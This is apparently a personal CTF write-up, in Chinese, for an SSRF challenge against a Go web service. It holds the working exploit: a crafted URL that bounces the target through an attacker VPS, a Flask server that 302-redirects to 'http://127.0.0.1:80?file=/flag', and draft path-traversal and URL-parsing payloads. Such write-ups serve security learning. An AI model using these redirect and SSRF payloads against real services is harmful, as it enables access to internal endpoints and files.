tags:: [[CTF/SSRF]]

- # 思路
	- SSRF+302跳转让目标访问127.0.0.1:80
- # 302
	- fuzz发现访问目标时`//a.a:1234/..`会发生302跳转，跳转到`//a.a:1234/../`
	- 所以让路由中的`client.Get`访问`http://127.0.0.1:1234//a.a:1234/..`会被跳转到`//a.a:1234/../`
	- 所以可以让他访问我们的VPS, 然后VPS再告诉它跳转到`http://127.0.0.1:80?file=/flag`
	- Exp
		- ```python
		  r = requests.post(url + "/vul", json = {
		      "url": f"http://127.0.0.1:1234//xxx:4051/.."
		  })
		  print(r.text)
		  ```
		- 然后在服务器`xxx:4051`上搭建：
			- ```python
			  from flask import Flask, redirect
			  
			  app = Flask(__name__)
			  
			  @app.route('/')
			  def my_redirect():
			      return redirect('http://127.0.0.1:80?file=/flag', code=302)
			  
			  if __name__ == '__main__':
			      app.run("127.0.0.1", 4051)
			  ```
- # 施工中
	- 考虑SSRF
	- 目录穿越？
		- ```python
		  r = base_get(url + "/aaa/../0cc175b9c0f1b6a831c399e269772661/0cc175b9c0f1b6a831c399e269772661")
		  print(r.status_code)
		  print(r.text)
		  # 正常返回文件内容
		  ```
	- golang解析url时的不一致问题
		- 这里带上问号和不带上，返回的结果不同
		- ```python
		  r = base_post(url + "/vul", json = {
		      "url": "http://127.0.0.1:1234/_@localhost:80/../0cc175b9c0f1b6a831c399e269772661/0cc175b9c0f1b6a831c399e269772661?"
		  })
		  
		  print(r.text)
		  ```